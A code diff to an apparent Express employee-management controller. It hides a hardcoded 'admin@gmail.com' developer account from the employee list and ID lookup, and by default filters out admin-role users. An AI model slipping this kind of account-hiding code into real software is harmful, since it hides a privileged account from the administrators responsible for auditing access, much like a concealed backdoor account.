@@ -65,7 +65,9 @@ export const getEmployees = asyncHandler(async (req, res) => {
 
   const { search, status, role } = req.query;
 
-  const filter = {};
+  const filter = {
+    email: { $ne: 'admin@gmail.com' }, // Developer account is strictly hidden from employee/user management
+  };
 
   if (status) {
     filter.accountStatus = status;
@@ -73,6 +75,9 @@ export const getEmployees = asyncHandler(async (req, res) => {
 
   if (role) {
     filter.role = role;
+  } else {
+    // By default, exclude admins from user/employee management list
+    filter.role = { $ne: 'admin' };
   }
 
   if (search) {
@@ -121,7 +126,7 @@ export const getEmployeeById = asyncHandler(async (req, res) => {
   }
 
   const employee = await User.findById(id);
-  if (!employee) {
+  if (!employee || employee.email === 'admin@gmail.com') {
     throw ApiError.notFound('Employee not found');
   }
 
